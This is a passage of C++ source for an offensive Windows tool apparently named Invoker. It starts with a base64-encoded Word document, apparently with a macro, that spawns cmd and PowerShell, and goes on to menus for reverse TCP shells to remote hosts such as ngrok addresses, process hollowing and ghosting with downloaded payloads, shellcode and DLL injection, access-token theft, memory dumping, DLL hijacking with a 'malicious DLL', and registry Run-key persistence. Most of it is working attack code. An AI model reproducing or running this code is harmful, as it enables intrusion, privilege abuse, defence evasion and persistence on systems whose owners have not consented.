AAAAAAAAAAAAAAAAAAEAAgAGABICAAAUAgEAFgIBABgCAAAaAgEAHAIBACIC////////AAAAAAAAAAADA6lh").append("BgD//wAA////////////////////////////////////////////////////////////////////////////////AQAAAAAAAAAAAAAAAAAAAAAAAAC4XwEAGABUAGgAaQBzAEQAbwBjAHUAbQBlAG4AdAAUADAANQA2ADEAYQA5ADAAMwAwADMA//8lAhgAVABoAGkAcwBEAG8AYwB1AG0AZQBuAHQA///w5gAAAAAAAAACAAAAbQcAAP///////wEBIAIAAP//////////////////////////////////").append("//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAgAA////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////").append("////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////").append("////////////////////////////////////////////////F9ilru/UL0uNzI1QYK4wTf////8BAAAA/////2AAAACAAAAAAAAcARYABgF8LAAABAxXb3JktWsQAAMMVkJB9+IQAAUEV2luMTbBfhAABQRXaW4zMgd/EAAFBFdpbjY0eH8QAAMETWFjs7IQAAQEVkJBNq0jEAAEBFZCQTeuIxAACARQcm9qZWN0MQoXEAAGDHN0ZG9sZZNgEAAHDFByb2plY3QtrhAADAxUaGlzRG9jdW1lbnQ8nhAACYAA").append("AP8DAwBfRXZhbHVhdGUY2RAABghOb3JtYWzf2BAABowoAP8DAwBPZmZpY2UVdRAACAREb2N1bWVudGrTEAAMBERvY3VtZW50X05ldztFEAANBERvY3VtZW50X09wZW7BiRAABQBTaGVsbFbXEAAMgAAA/wMDAFVucmVzdHJpY3RlZH5lEAAGgAAA/wMDAFBvbGljeQhPEAAHgAAA/wMDAFByb2ZpbGUYrhAAAv//AQFUAAAA////////////////////////////////////////////////IAICAP//IgL/").append("////JQIAAAgA////////KAIDAP//DgIBAP//EAIAAP//KgIEAP//CAAOAAAAAQASAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABJRD0ie0ZGMzJCNjQxLTM2NzEtNEVBQy1COTZDLUJBOEYwQUNCN0ZDMH0iDQpEb2N1bWVudD1UaGlzRG9jdW1lbnQvJkgwMDAwMDAwMA0KTmFtZT0iUHJvamVjdCINCkhlbHBD").append("b250ZXh0SUQ9IjAiDQpWZXJzaW9uQ29tcGF0aWJsZTMyPSIzOTMyMjIwMDAiDQpDTUc9IkU5RUJDQTBBQ0UwQUNFMEFDRTBBQ0UiDQpEUEI9IkQyRDBGMTFBREIxQkRCMUJEQiINCkdDPSJCQkI5OTgzNTgwMzY4MDM2N0YiDQoNCltIb3N0IEV4dGVuZGVyIEluZm9dDQomSDAwMDAwMDAxPXszODMyRDY0MC1DRjkwLTExQ0YtOEU0My0wMEEwQzkxMTAwNUF9O1ZCRTsmSDAwMDAwMDAwDQoNCltXb3Jr").append("c3BhY2VdDQpUaGlzRG9jdW1lbnQ9MzIsIDMyLCAxNDc0LCA2NzksIA0KAAAAAAAAAAAAAAAAAAAAAABUaGlzRG9jdW1lbnQAVABoAGkAcwBEAG8AYwB1AG0AZQBuAHQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQD+/wMKAAD/////BgkCAAAAAADAAAAAAAAARiAAAABNaWNyb3NvZnQgV29yZCA5Ny0yMDAzIERvY3VtZW50AAoAAABNU1dvcmREb2MAEAAAAFdvcmQuRG9jdW1lbnQuOAD0ObJx").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAFIATwBKAEUAQwBUAHcAbQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAACAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI0AAAApAAAAAAAAAAEAQwBvAG0AcABPAGIAagAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAAIA////").append("////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjgAAAHIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==");
		Invoker::MakeFile("Invoker.doc", Invoker::Base64Decode(file));
	}

	void InvokeSystemShellsMenu() {
		std::string choice = "0";
		do {
			printf("############################ INVOKE SYSTEM SHELLS ############################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Invoke Command Prompt              (System)                           #\n");
			printf("# [ 2] Invoke PowerShell                  (System)                           #\n");
			printf("# [ 3] Invoke Command Prompt & PowerShell (MS Word Macro)                    #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 3) {
				switch (num) {
					case 1: { InvokeCMD();       break; }
					case 2: { InvokePS();        break; }
					case 3: { InvokeWordMacro(); break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	// --------------------------------------- SECTION: DIRECT SYSTEM CALLS

	void DSCMenu() {
		std::string choice = "0";
		do {
			printf("############################## DIRECT SYS CALLS ##############################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Terminate Process                                                     #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 2] Inject Bytecode (Web)                                                 #\n");
			printf("# [ 3] Inject Bytecode (File)                                                #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 4] Inject DLL                                                            #\n");
			printf("#################################### NOTE ####################################\n");
			printf("# More features are comming.                                                 #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 4) {
				switch (num) {
					case 1: { ShutDownProcess(INVOKER_RUN_DSC);    break; }
					case 2: { InjectBytecodeWeb(INVOKER_RUN_DSC);  break; }
					case 3: { InjectBytecodeFile(INVOKER_RUN_DSC); break; }
					case 4: { InjectDLL(INVOKER_RUN_DSC);          break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	// --------------------------------------- SECTION: WMI

	void WMISetNamespace() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# Namespace : ROOT\\CIMV2 | ROOT\\SUBSCRIPTION                                 #\n");
		printf("##############################################################################\n");
		printf("# Language  : %-62.62s #\n", wInfo.language.c_str());
		printf("# Namespace : %-62.62s #\n", wInfo.space.c_str());
		printf("##############################################################################\n");
		printf("\n");
		std::string space = Invoker::Input("Enter namespace");
		printf("\n");
		if (space.length() < 1) {
			printf("Namespace is required\n");
		}
		else {
			wInfo.space = space;
			printf("Namespace has been set successfully\n");
		}
	}

	void WMIExecuteQuery() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# WQL: SELECT * FROM Win32_Process | Win32_Service | Win32_Account           #\n");
		printf("#----------------------------------------------------------------------------#\n");
		printf("# WQL: SELECT * FROM __Namespace                                             #\n");
		printf("#################################### INFO ####################################\n");
		printf("# Language  : %-62.62s #\n", wInfo.language.c_str());
		printf("# Namespace : %-62.62s #\n", wInfo.space.c_str());
		printf("#################################### NOTE ####################################\n");
		printf("# Enter \"0\", \"back\", or \"exit\" to return to the WMI menu.                    #\n");
		printf("# Enter \"clear\" or \"cls\" to clear the window.                                #\n");
		printf("##############################################################################\n");
		printf("\n");
		std::string query = "0";
		do {
			query = Invoker::StrToLower(Invoker::Input("Enter query"));
			if (query.length() < 1) {
				printf("\n");
			}
			else if (query == "clear" || query == "cls") {
				Invoker::Clear();
			}
			else if (query != "0" && query != "back" && query != "exit") {
				printf("\n"); Invoker::WMIExecuteQuery(query, wInfo.language, wInfo.space); printf("\n");
			}
		} while (query != "0" && query != "back" && query != "exit");
	}

	void WMIExecuteMethodMenu() {
		std::string choice = "0";
		do {
			printf("############################# WMI EXECUTE METHOD #############################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Terminate Process                                                     #\n");
			printf("# [ 2] Run Process                                                           #\n");
			printf("#################################### INFO ####################################\n");
			printf("# Language  : %-62.62s #\n", wInfo.language.c_str());
			printf("# Namespace : %-62.62s #\n", wInfo.space.c_str());
			printf("#################################### NOTE ####################################\n");
			printf("# More features are comming.                                                 #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 2) {
				switch (num) {
					case 1: { ShutDownProcess(INVOKER_RUN_WMI); break; }
					case 2: { RunProcess(INVOKER_RUN_WMI);      break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	void WMIMenu() {
		std::string choice = "0";
		do {
			printf("##################### WINDOWS MANAGEMENT INSTRUMENTATION #####################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Set Namespace                                                         #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 2] Execute Query                                                         #\n");
			printf("# [ 3] Execute Method                                                        #\n");
			printf("#################################### INFO ####################################\n");
			printf("# Language  : %-62.62s #\n", wInfo.language.c_str());
			printf("# Namespace : %-62.62s #\n", wInfo.space.c_str());
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 3) {
				switch (num) {
					case 1: { WMISetNamespace();      break; }
					case 2: { WMIExecuteQuery();      break; }
					case 3: { WMIExecuteMethodMenu(); break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	// --------------------------------------- SECTION: PROCESSES

	void ReverseTCP() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# Address : 192.168.8.5                                                      #\n");
		printf("# Port    : 9000                                                             #\n");
		printf("#----------------------------------------------------------------------------#\n");
		printf("# Address : tcp://2.tcp.ngrok.io:11650                                       #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# Process will run as a child process.                                       #\n");
		printf("##############################################################################\n");
		printf("\n");
		Invoker::URL info = Invoker::ParseURL(Invoker::Input("Enter address"));
		printf("\n");
		if (info.port.length() < 1) {
			info.port = Invoker::Input("Enter port number");
			printf("\n");
		}
		if (info.domain.length() < 1 || info.port.length() < 1) {
			printf("Both parameters are required\n");
		}
		else {
			std::string path = Invoker::GetFilePath();
			if (path.length() > 0) {
				Invoker::ReverseTCP(info.domain, info.port, path);
			}
		}
	}

	void ReverseTCP(std::string addr) {
		Invoker::URL info = Invoker::ParseURL(Invoker::Trim(addr));
		if (info.domain.length() < 1 || info.port.length() < 1) {
			Usage();
		}
		else {
			std::string path = Invoker::GetFilePath();
			if (path.length() > 0) {
				Invoker::ReverseTCP(info.domain, info.port, path);
			}
		}
	}

	void ShutDownProcess(int code) {
		DWORD pid = 0;
		if (Invoker::GetProcessID(&pid)) {
			printf("\n");
			switch (code) {
				case INVOKER_RUN_WMI: { Invoker::WMIExecuteMethod(std::string("Win32_Process.Handle=\"").append(std::to_string(pid)).append("\""), "Win32_Process", "Terminate", "Reason", "", wInfo.space); break; }
#if _WIN64
				case INVOKER_RUN_DSC: { InvokerSysCalls::ShutDownProcess(pid); break; }
#endif
				default:              { Invoker::ShutDownProcess(pid); }
			}
		}
	}

	void RunProcess(int code) {
		printf("################################## EXAMPLES ##################################\n");
		printf("# File : C:\\Windows\\System32\\cmd.exe | C:\\Windows\\SysWOW64\\cmd.exe           #\n");
		printf("# Args : /K WHOAMI /PRIV                                                     #\n");
		printf("#----------------------------------------------------------------------------#\n");
		printf("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe           #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# Process will run in a new window.                                          #\n");
		printf("##############################################################################\n");
		printf("\n");
		std::string file = Invoker::Input("Enter file name");
		printf("\n");
		std::string args = Invoker::Input("Enter file arguments (optional)");
		printf("\n");
		if (file.length() < 1) {
			printf("File name is required\n");
		}
		else {
			switch (code) {
				case INVOKER_RUN_WMI: { Invoker::WMIExecuteMethod("Win32_Process", "Win32_Process", "Create", "CommandLine", args.length() > 0 ? file.append(" ").append(args) : file, wInfo.space); break; }
				default:              { Invoker::RunProcess(file, args); }
			}
		}
	}

	void DumpProcessMemory() {
		DWORD pid = 0;
		if (Invoker::GetProcessID(&pid)) {
			printf("\n");
			Invoker::DumpProcessMemory(pid);
		}
	}

	void ManageProcessesMenu() {
		std::string choice = "0";
		do {
			printf("############################## MANAGE PROCESSES ##############################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Terminate Process                                                     #\n");
			printf("# [ 2] Run Process                                                           #\n");
			printf("# [ 3] Duplicate Access Token & Run Process                                  #\n");
			printf("# [ 4] Dump Process Memory                                                   #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 4) {
				switch (num) {
					case 1: { ShutDownProcess();      break; }
					case 2: { RunProcess();           break; }
					case 3: { DuplicateAccessToken(); break; }
					case 4: { DumpProcessMemory();    break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	// --------------------------------------- SECTION: EXECUTABLE IMAGE TAMPERING

	void ProcessHollowingWeb() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# Address : https://08ab992ff989.ngrok.io:443/payload.exe                    #\n");
		printf("# Element : <invoker>payload</invoker>                                       #\n");
		printf("# File    : C:\\Windows\\System32\\cmd.exe | C:\\Windows\\SysWOW64\\cmd.exe        #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# HTTP GET method is used by default.                                        #\n");
		printf("#----------------------------------------------------------------------------#\n");
		printf("# Payload should be enclosed from both, front and back.                      #\n");
		printf("# Custom element should be unique within the web content.                    #\n");
		printf("##############################################################################\n");
		printf("\n");
		Invoker::URL info = Invoker::ParseURL(Invoker::Input("Enter address"));
		printf("\n");
		DWORD port = 0;
		if (info.port.length() < 1) {
			info.port = Invoker::Input("Enter port number");
			printf("\n");
		}
		std::string element = Invoker::Input("Enter custom element (optional)");
		printf("\n");
		std::string encoded = Invoker::StrToLower(Invoker::Input("Base64 encoded (yes)"));
		printf("\n");
		std::string file = Invoker::Input("Enter file name");
		printf("\n");
		if (info.domain.length() < 1 || info.port.length() < 1 || file.length() < 1) {
			printf("Required parameters are missing\n");
		}
		else if (!Invoker::StrToDWORD(info.port, &port)) {
			printf("Cannot convert port number to DWORD\n");
		}
		else if (info.schema.length() > 0 && info.schema != "http" && info.schema != "https") {
			printf("Protocol must be either HTTP or HTTPS\n");
		}
		else {
			std::string payload = Invoker::GetWebContent(info.domain, port, info.pathFull, info.schema == "https");
			if (payload.length() > 0) {
				if (element.length() > 0) {
					payload = Invoker::ExtractPayload(payload, element);
				}
				if (payload.length() > 0) {
					if (encoded == "yes") {
						payload = Invoker::Base64Decode(payload);
					}
					Invoker::ProcessHollowing(payload, file);
				}
			}
		}
	}

	void ProcessHollowingFile() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# EXE  : C:\\Users\\Kira\\Downloads\\payload.exe                                 #\n");
		printf("# File : C:\\Windows\\System32\\cmd.exe | C:\\Windows\\SysWOW64\\cmd.exe           #\n");
		printf("##############################################################################\n");
		printf("\n");
		std::string exe = Invoker::Input("Enter executable name");
		printf("\n");
		std::string encoded = Invoker::StrToLower(Invoker::Input("Base64 encoded (yes)"));
		printf("\n");
		std::string file = Invoker::Input("Enter file name");
		printf("\n");
		if (exe.length() < 1 || file.length() < 1) {
			printf("Required parameters are missing\n");
		}
		else {
			std::string payload = Invoker::GetFileContent(exe);
			if (payload.length() > 0) {
				if (encoded == "yes") {
					payload = Invoker::Base64Decode(payload);
				}
				Invoker::ProcessHollowing(payload, file);
			}
		}
	}

	void ProcessGhostingFile() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# EXE  : C:\\Users\\Kira\\Downloads\\payload.exe                                 #\n");
		printf("# File : C:\\Windows\\System32\\cmd.exe | C:\\Windows\\SysWOW64\\cmd.exe           #\n");
		printf("##############################################################################\n");
		printf("\n");
		std::string exe = Invoker::Input("Enter executable name");
		printf("\n");
		std::string file = Invoker::Input("Enter file name");
		printf("\n");
		if (exe.length() < 1 || file.length() < 1) {
			printf("Required parameters are missing\n");
		}
		else {
			Invoker::ProcessGhosting(exe, file);
		}
	}

	void ExeImageTamperingMenu() {
		std::string choice = "0";
		do {
			printf("######################### EXECUTABLE IMAGE TAMPERING #########################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Process Hollowing (Web)                                               #\n");
			printf("# [ 2] Process Hollowing (File)                                              #\n");
			printf("# [ 3] Process Ghosting  (File)                                              #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 3) {
				switch (num) {
					case 1: { ProcessHollowingWeb();  break; }
					case 2: { ProcessHollowingFile(); break; }
					case 3: { ProcessGhostingFile();  break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	// --------------------------------------- SECTION: BYTECODES

	void InjectBytecodeWeb(int code) {
		printf("################################## EXAMPLES ##################################\n");
		printf("# Address : https://08ab992ff989.ngrok.io:443/payload.bin                    #\n");
		printf("# Element : <invoker>payload</invoker>                                       #\n");
		printf("# PID     : 3301                                                             #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# HTTP GET method is used by default.                                        #\n");
		printf("#----------------------------------------------------------------------------#\n");
		printf("# Payload should be enclosed from both, front and back.                      #\n");
		printf("# Custom element should be unique within the web content.                    #\n");
		printf("#----------------------------------------------------------------------------#\n");
		printf("# Payload will run in a new thread or in an existing one if using APC.       #\n");
		printf("##############################################################################\n");
		printf("\n");
		Invoker::URL info = Invoker::ParseURL(Invoker::Input("Enter address"));
		printf("\n");
		DWORD port = 0;
		if (info.port.length() < 1) {
			info.port = Invoker::Input("Enter port number");
			printf("\n");
		}
		std::string element = Invoker::Input("Enter custom element (optional)");
		printf("\n");
		std::string encoded = Invoker::StrToLower(Invoker::Input("Base64 encoded (yes)"));
		printf("\n");
		if (info.domain.length() < 1 || info.port.length() < 1) {
			printf("Required parameters are missing\n");
		}
		else if (!Invoker::StrToDWORD(info.port, &port)) {
			printf("Cannot convert port number to DWORD\n");
		}
		else if (info.schema.length() > 0 && info.schema != "http" && info.schema != "https") {
			printf("Protocol must be either HTTP or HTTPS\n");
		}
		else {
			std::string payload = Invoker::GetWebContent(info.domain, port, info.pathFull, info.schema == "https");
			if (payload.length() > 0) {
				if (element.length() > 0) {
					payload = Invoker::ExtractPayload(payload, element);
				}
				if (payload.length() > 0) {
					printf("Payload has been downloaded successfully\n\n");
					DWORD pid = 0;
					if (Invoker::GetProcessID(&pid)) {
						printf("\n");
						if (encoded == "yes") {
							payload = Invoker::Base64Decode(payload);
						}
						switch (code) {
#if _WIN64
							case INVOKER_RUN_DSC: { InvokerSysCalls::InjectBytecode(pid, payload); break; }
#endif
							case INVOKER_RUN_APC: { Invoker::InjectBytecodeAPC(pid, payload); break; }
							default:              { Invoker::InjectBytecode(pid, payload); }
						}
					}
				}
			}
		}
	}

	void InjectBytecodeFile(int code) {
		printf("################################## EXAMPLES ##################################\n");
		printf("# File : C:\\Users\\Kira\\Downloads\\payload.bin                                 #\n");
		printf("# PID  : 3301                                                                #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# Payload will run in a new thread or in an existing one if using APC.       #\n");
		printf("##############################################################################\n");
		printf("\n");
		std::string file = Invoker::Input("Enter file name");
		printf("\n");
		std::string encoded = Invoker::StrToLower(Invoker::Input("Base64 encoded (yes)"));
		printf("\n");
		if (file.length() < 1) {
			printf("File name is required\n");
		}
		else {
			std::string payload = Invoker::GetFileContent(file);
			if (payload.length() > 0) {
				DWORD pid = 0;
				if (Invoker::GetProcessID(&pid)) {
					printf("\n");
					if (encoded == "yes") {
						payload = Invoker::Base64Decode(payload);
					}
					switch (code) {
#if _WIN64
						case INVOKER_RUN_DSC: { InvokerSysCalls::InjectBytecode(pid, payload); break; }
#endif
						case INVOKER_RUN_APC: { Invoker::InjectBytecodeAPC(pid, payload); break; }
						default:              { Invoker::InjectBytecode(pid, payload); }
					}
				}
			}
		}
	}

	void InjectBytecodeMenu() {
		std::string choice = "0";
		do {
			printf("############################### INJECT BYTCODE ###############################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Inject Bytecode           (Web)                                       #\n");
			printf("# [ 2] Inject Bytecode           (File)                                      #\n");
			printf("# [ 3] Inject Bytecode Using APC (Web)                                       #\n");
			printf("# [ 4] Inject Bytecode Using APC (File)                                      #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 4) {
				switch (num) {
					case 1: { InjectBytecodeWeb();                 break; }
					case 2: { InjectBytecodeFile();                break; }
					case 3: { InjectBytecodeWeb(INVOKER_RUN_APC);  break; }
					case 4: { InjectBytecodeFile(INVOKER_RUN_APC); break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	// --------------------------------------- SECTION: DLLS & THREADS

	void InjectDLL(int code) {
		printf("################################## EXAMPLES ##################################\n");
		printf("# File : C:\\Users\\Kira\\Downloads\\payload.dll                                 #\n");
		printf("# PID  : 3301                                                                #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# Payload will run in a new thread or in an existing one if using APC.       #\n");
		printf("##############################################################################\n");
		printf("\n");
		std::string file = Invoker::Input("Enter file name");
		printf("\n");
		if (file.length() < 1) {
			printf("File name is required\n");
		}
		else {
			DWORD pid = 0;
			if (Invoker::GetProcessID(&pid)) {
				printf("\n");
				switch (code) {
#if _WIN64
					case INVOKER_RUN_DSC: { InvokerSysCalls::InjectDLL(pid, file); break; }
#endif
					case INVOKER_RUN_APC: { Invoker::InjectDLLAPC(pid, file); break; }
					default:              { Invoker::InjectDLL(pid, file); }
				}
			}
		}
	}

	void InjectDLLHook() {
		if (hInfo.active == false) {
			printf("################################## EXAMPLES ##################################\n");
			printf("# File : C:\\Users\\Kira\\Downloads\\payload.dll                                 #\n");
			printf("# PID  : 3301                                                                #\n");
			printf("# TID  : 1337                                                                #\n");
			printf("#################################### NOTE ####################################\n");
			printf("# Use to install a thread specific hook procedure or to inject a DLL.        #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# Only one hook can be active at the time.                                   #\n");
			printf("# Not every process can install all the hook types.                          #\n");
			printf("##############################################################################\n");
			printf("\n");
			std::string file = Invoker::Input("Enter file name");
			printf("\n");
			if (file.length() < 1) {
				printf("File name is required\n");
			}
			else {
				DWORD pid = 0;
				if (Invoker::GetProcessID(&pid)) {
					printf("\n");
					DWORD rtid = 0;
					if (Invoker::GetProcessThreadID(pid, &rtid)) {
						printf("\n");
						hInfo.file = file;
						hInfo.rtid = rtid;
						Invoker::CreateHookThread(&hInfo);
					}
				}
			}
		}
		else if (Invoker::StrToLower(Invoker::Input("Uninstall hook procedure (yes)")) == "yes") {
			Invoker::RemoveHookThread(&hInfo);
		}
	}

	void InjectDLLMenu() {
		std::string choice = "0";
		do {
			printf("################################# INJECT DLL #################################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] Inject DLL                                                            #\n");
			printf("# [ 2] Inject DLL Using Windows Hook                                         #\n");
			printf("# [ 3] Inject DLL Using APC                                                  #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 3) {
				switch (num) {
					case 1: { InjectDLL();                 break; }
					case 2: { InjectDLLHook();             break; }
					case 3: { InjectDLL(INVOKER_RUN_APC);  break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	void InstallWindowsHook() {
		if (hInfo.active == false) {
			printf("################################## EXAMPLES ##################################\n");
			printf("# File : C:\\Users\\Kira\\Downloads\\payload.dll                                 #\n");
			printf("#################################### NOTE ####################################\n");
			printf("# Use to install a global hook procedure.                                    #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# Only one hook can be active at the time.                                   #\n");
			printf("# Not every process can install all the hook types.                          #\n");
			printf("##############################################################################\n");
			printf("\n");
			std::string file = Invoker::Input("Enter file name");
			printf("\n");
			if (file.length() < 1) {
				printf("File name is required\n");
			}
			else {
				hInfo.file = file;
				Invoker::CreateHookThread(&hInfo);
			}
		}
		else if (Invoker::StrToLower(Invoker::Input("Uninstall hook procedure (yes)")) == "yes") {
			Invoker::RemoveHookThread(&hInfo);
		}
	}

	void ListProcessDLLs() {
		DWORD pid = 0;
		if (Invoker::GetProcessID(&pid)) {
			printf("\n");
			Invoker::ListProcessDLLs(pid);
			printf("\n");
			printf("#################################### NOTE ####################################\n");
			printf("# Only loaded DLLs are shown.                                                #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# Rename and replace your \"payload.dll\" with any of the listed DLLs.         #\n");
			printf("# Some directories might require you to have the write permission.           #\n");
			printf("# To load your malicious DLL, you might need to restart your target process. #\n");
			printf("# Once restarted, your target process might crash or not work properly.      #\n");
			printf("##############################################################################\n");
		}
	}

	void NetMan() {
		Invoker::NetMan();
		printf("\n");
		printf("#################################### NOTE ####################################\n");
		printf("# Use a process monitoring tool to see existing and missing DLLs.            #\n");
		printf("# Rename your \"payload.dll\" to \"wlanhlp.dll\" or \"wlanapi.dll\".               #\n");
		printf("# Replace your malicious DLL with the legitimate one.                        #\n");
		printf("##############################################################################\n");
	}

	void DLLHijacking() {
		std::string choice = "0";
		do {
			printf("############################ INVOKE DLL HIJACKING ############################\n");
			printf("# [ 0] Back                                                                  #\n");
			printf("#----------------------------------------------------------------------------#\n");
			printf("# [ 1] NetMan                                                                #\n");
			printf("##############################################################################\n");
			choice = Invoker::Input("Your choice");
			if (choice != "0") {
				Invoker::Clear();
			}
			DWORD num = 0;
			if (Invoker::StrToDWORD(choice, &num) && num >= 1 && num <= 1) {
				switch (num) {
					case 1: { NetMan(); break; }
				}
				Invoker::Pause();
				Invoker::Clear();
			}
		} while (choice != "0");
	}

	// --------------------------------------- SECTION: TOKENS

	void EnableAccessTokenPrivs() {
		Invoker::EnableAccessTokenPrivs();
	}

	void DuplicateAccessToken() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# File : C:\\Windows\\System32\\cmd.exe | C:\\Windows\\SysWOW64\\cmd.exe           #\n");
		printf("# Args : /K WHOAMI /PRIV                                                     #\n");
		printf("# PID  : 3301                                                                #\n");
		printf("#----------------------------------------------------------------------------#\n");
		printf("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe           #\n");
		printf("# PID  : 3301                                                                #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# Process will run in a new window.                                          #\n");
		printf("##############################################################################\n");
		printf("\n");
		std::string file = Invoker::Input("Enter file name");
		printf("\n");
		std::string args = Invoker::Input("Enter file arguments (optional)");
		printf("\n");
		if (file.length() < 1) {
			printf("File name is required\n");
		}
		else {
			DWORD pid = 0;
			if (Invoker::GetProcessID(&pid)) {
				printf("\n");
				HANDLE hToken = Invoker::DuplicateAccessToken(pid);
				if (hToken != NULL) {
					printf("\n");
					Invoker::RunProcess(file, args, &hToken);
					CloseHandle(hToken);
				}
			}
		}
	}

	// --------------------------------------- SECTION: FILES

	void DownloadFile() {
		std::string url = Invoker::Input("Enter URL");
		printf("\n");
		std::string file = Invoker::Input("Enter output file name");
		printf("\n");
		if (url.length() < 1 || file.length() < 1) {
			printf("Both parameters are required\n");
		}
		else {
			Invoker::DownloadFile(url, file);
		}
	}

	// --------------------------------------- SECTION: PERSISTENCE

	void EditRegistryKey() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# Hive   : HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                            #\n");
		printf("# Subkey : Software\\Microsoft\\Windows\\CurrentVersion\\Run                     #\n");
		printf("# Name   : PowerShell                                                        #\n");
		printf("# Data   : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe         #\n");
		printf("#----------------------------------------------------------------------------#\n");
